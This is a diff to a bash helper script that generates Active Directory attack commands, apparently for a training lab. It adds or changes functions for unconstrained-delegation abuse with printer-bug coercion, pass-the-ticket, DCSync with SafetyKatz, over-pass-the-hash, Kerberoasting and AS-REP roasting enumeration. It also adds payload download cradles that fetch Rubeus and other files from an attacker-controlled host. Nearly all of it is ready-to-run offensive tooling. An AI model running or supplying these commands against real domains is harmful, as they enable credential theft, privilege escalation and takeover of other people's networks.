@@ -15,7 +15,7 @@ PowerView Enumeration
 nb-ad-pwsh-enum-domain         PowerView domain enumeration commands
 nb-ad-pwsh-enum-userhunt       PowerView user session hunting enumeration commands
 nb-ad-pwsh-enum-users          PowerView user and computer enumeration commands
-nb-ad-pwsh-enum-dcsync         Powerview user replication reights enumeration
+nb-ad-pwsh-enum-acls           Powerview ACLs rights enumeration like kerberoasts, DCsync etc.
 
 Lateral Movement
 ----------------
@@ -27,6 +27,7 @@ nb-ad-pwsh-dump-secrets        dump secrets on windows machine using Invoke-Mimi
 Domain Privilege Escalation
 ---------------------------
 nb-ad-pwsh-opth                execute over-pass-the-hash with Rubeus
+nb-ad-pwsh-ptt                 execute pass-the-ticket with Rubeus
 nb-ad-pwsh-dcsync              execute DCSync attack with SafetyKatz for krbtgt user
 nb-ad-pwsh-kerberoasting       kerberoasting
 nb-ad-pwsh-unconstrained       unconstrained delegation
@@ -56,19 +57,77 @@ nb-ad-cmd-ping                 sweep a network subnet with ping requests on wind
 DOC
 }
 
-nb-ad-pwsh-enum-dcsync() {
+nb-ad-pwsh-unconstrained() {
+    __check-project
+    __warn "NOTE: the prerequisite for elevation using unconstrained delegation is having admin access shell to the machine."
+    echo
+    __info "You can check which machine allows for unconstrained delegation with command:"
+    __ok "nb-ad-pwsh-enum-acls"
+    echo
+    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __ok "monitor"
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+    echo
+    __ask "Enter the DC's hostname"
+    nb-vars-set-rhost
+    nb-vars-set-lhost
+    nb-vars-set-domain
+    echo
+    __ask "Enter the listening machine hostname"
+    local ma && __askvar ma HOSTNAME
+
+    __COMMAND=".\\\\Loader.exe -path http://${__LHOST}/Rubeus.exe -args %Pwn% /targetuser:${__RHOST}$ /interval:5 /nowrap C:\\\\Users\\\\Public\\\\Rubeus.exe monitor /targetuser:${__RHOST}$ /interval:5 /nowrap"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+    echo
+    __info "Next you need to use command to force authentication to of the DC to the listener machine:"
+    __COMMAND2=".\\\\MS-RPRN.exe \\\\\\\\${__RHOST}.${__DOMAIN} \\\\\\\\${ma}.${__DOMAIN}"
+    __ok "$__COMMAND2"
+}
+
+nb-ad-pwsh-enum-acls() {
+    clear
+
     __warn "Load PowerView with:"
     __ok ". .\\PowerView.ps1"
     __ok "nb-pwsh-file-download    - Execute in memory"
 
     echo
-    __ask "Enter user to check for DCsync rights"
-    nb-vars-set-user
+    __ask "PowerView check for domain PrivEsc vectors:"
+    echo "1. Kerberoastable users"
+    echo "2. Check if user has DCSync rights"
+    echo "3. Unconstrained delegation"
+    echo "4. Constrained delegation for user"
+    echo "5. Constrained delegation for machine"
+    echo "6. Resource-based constrained delegation"
+    echo "7. AS-REP Roast"
+    echo "8. Return to previous menu"
+    echo
+    echo -n "Choose a command to copy: "
+    read choice
 
-    __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
-    local dn && __askvar dn DN
-
-    __COMMAND="Get-DomainObjectAcl -SearchBase \"${dn}\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty 'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match \"${__USER}\"}"
+    case $choice in
+        1) __COMMAND="Get-DomainUser -SPN";;
+        2) 
+          echo
+          __ask "Enter user to check for DCsync rights"
+          nb-vars-set-user
+          __ask "Enter a distinguished name (DN), such as: 'dc=htb,dc=local'"
+          local dn && __askvar dn DN
+          __COMMAND="Get-DomainObjectAcl -SearchBase \"${dn}\" -SearchScope Base -ResolveGUIDs | ?{(\$_.ObjectAceType -match 'replication-get') -or (\$_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {\$_ | Add-Member NoteProperty 'IdentityName' \$(Convert-SidToName \$_.SecurityIdentifier);\$_} | ?{\$_.IdentityName -match \"${__USER}\"}"
+          ;;
+        3) __COMMAND="Get-DomainComputer -Unconstrained | select -ExpandProperty name";;
+        4) __COMMAND="Get-DomainUser -TrustedToAuth";;
+        5) __COMMAND="Get-DomainComputer -TrustedToAuth";;
+        6) __COMMAND="Find-InterestingDomainACL | ?{\$_.identityreferencename -match 'ciadmin'}";;
+        7) __COMMAND="Get-DomainUser -PreauthNotRequired -Verbose";;
+        8) return;;
+        *) echo "Invalid option"; sleep 1; nb-ad-pwsh-enum-acls; return;;
+    esac
 
     echo "$__COMMAND" | wl-copy
     echo
@@ -78,12 +137,13 @@ nb-ad-pwsh-enum-dcsync() {
 
 nb-ad-pwsh-dcsync() {
     __check-project
-    __ask "Enter AES256 version of the hash"
-    __check-hash
+    __info "You can check if user has DCSync rights with command:"
+    __ok "nb-ad-pwsh-enum-acls"
+    echo
 
     __warn "First encode the following command with: .\\ArgSplit.bat:"
     __ok "lsadump::dcsync"
-    __info "Then check the encoded command with:"
+    __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
 
     __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\SafetyKatz.exe -args \"%Pwn% /user:dcorp\krbtgt\" \"exit\""
@@ -102,7 +162,7 @@ nb-ad-pwsh-opth() {
 
     __warn "First encode the following command with: .\\ArgSplit.bat:"
     __ok "asktgt"
-    __info "Then check the encoded command with:"
+    __ask "Then check the encoded command with:"
     __ok "echo %Pwn%"
 
     __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /domain:dollarcorp.moneycorp.local /user:${__USER} /aes256:${__HASH} /opsec /createnetonly:C:\\Windows\\System32\\cmd.exe /show /ptt"
@@ -110,6 +170,23 @@ nb-ad-pwsh-opth() {
     echo "$__COMMAND" | wl-copy
     echo
     __info "Command copied to clipboard:"
+    __ok "$__COMMAND"
+}
+
+nb-ad-pwsh-ptt() {
+    __check-project
+
+    __warn "First encode the following command with: .\\ArgSplit.bat:"
+    __ok "ptt"
+    __ask "Then check the encoded command with:"
+    __ok "echo %Pwn%"
+
+    __COMMAND="C:\\AD\\Tools\\Loader.exe -path C:\\AD\\Tools\\Rubeus.exe -args %Pwn% /ticket:"
+
+    echo "$__COMMAND" | wl-copy
+    echo
+    __info "Enter the base64-encoded ticket in place of /ticket"
+    __info "Run from elevated shell:"
     __ok "$__COMMAND"
 }
 
@@ -250,6 +327,8 @@ nb-ad-pwsh-dump-secrets() {
 }
 
 nb-ad-pwsh-file-download() {
+    __warn "If you're not in powershell session and use powershell command, prepend it with powershell -c"
+    echo
     nb-vars-set-lhost
     nb-vars-set-lport
     local filename && __askvar filename "FILENAME"
@@ -271,7 +350,7 @@ nb-ad-pwsh-file-download() {
             read choice
 
             case $choice in
-                1) __COMMAND="Invoke-WebRequest http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
+                1) __COMMAND="iwr http://${__LHOST}:${__LPORT}/$filename -OutFile $filename";;
                 2) __COMMAND="certutil -URLcache -split -f http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
                 3) __COMMAND="wget http://${__LHOST}:${__LPORT}/$filename -O $filename";;
                 4) __COMMAND="bitsadmin /transfer n http://${__LHOST}:${__LPORT}/$filename C:\\Windows\\Temp\\$filename";;
